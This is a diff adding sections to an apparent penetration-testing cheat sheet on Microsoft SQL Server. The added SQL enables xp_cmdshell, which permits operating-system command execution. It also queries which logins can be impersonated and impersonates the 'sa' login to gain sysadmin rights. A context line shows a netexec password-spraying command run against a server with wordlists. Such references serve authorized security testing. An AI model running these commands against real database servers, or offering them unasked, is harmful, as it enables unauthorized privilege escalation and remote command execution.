@@ -27,6 +27,36 @@ netexec mssql 10.10.10.1 -u /opt/common_users.txt -p /opt/unix_passwords.txt --l
 ```
 {% endcode %}
 
+### Enable xp\_cmdshell
+
+{% code overflow="wrap" %}
+```sql
+EXEC sp_configure 'show advanced options', '1'
+RECONFIGURE
+EXEC sp_configure 'xp_cmdshell', '1' 
+RECONFIGURE
+```
+{% endcode %}
+
+### Impersonate Other User
+
+{% code overflow="wrap" %}
+```sql
+# Find users you can impersonate
+SELECT distinct b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE'
+# Check if the user "sa" or any other high privileged user is mentioned
+
+# Impersonate sa user
+EXECUTE AS LOGIN = 'sa'
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+```
+{% endcode %}
+
 ### Impacket-MSSQLClient
 
 ```bash
